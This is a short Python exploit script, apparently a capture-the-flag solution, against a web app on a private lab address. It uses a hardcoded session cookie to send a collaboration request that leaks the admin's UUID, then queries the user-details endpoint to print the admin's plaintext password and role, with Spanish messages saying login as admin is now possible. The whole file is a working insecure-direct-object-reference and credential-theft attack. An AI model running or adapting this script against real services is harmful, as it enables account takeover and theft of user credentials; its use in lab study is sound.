import requests

BASE_URL = "http://172.17.0.2:5000"
COLLAB_URL = f"{BASE_URL}/collab/request"
USER_DETAILS_URL = f"{BASE_URL}/users/{{}}"

session = requests.Session()
session.cookies.set("session", "eyJ1dWlkIjoiNDc1YzJmMjgtNmM4YS00MTgxLWFjNmMtYTMxMzAyNTdjZWMxIn0.aOE-IA.dRsIiO87amo7Y1E8Z_afxwdHRuU")

data = {
    "username": "admin",
    "title": "CTF Collaboration",
    "content": "Let's work together on this puzzle."
}

r = session.post(COLLAB_URL, data=data)
print(f"[i] Status Code: {r.status_code}")
if r.status_code == 200:
    response = r.json()
    admin_uuid = response.get("to_uuid")
    print(f"[+] UUID del admin: {admin_uuid}")

    r2 = session.get(USER_DETAILS_URL.format(admin_uuid))
    if r2.status_code == 200:
        user = r2.json()
        print(f"[✓] Usuario: {user['username']}")
        print(f"Password: {user['password']}")
        print(f"Rol: {user['role']}")
        if user['role'] == '0':
            print("[🔥] ¡Este es el admin! Ya podés loguearte en /login")
    else:
        print("[✗] No se pudo consultar /users/<uuid>")
else:
    print("[✗] Falló el envío de colaboración")
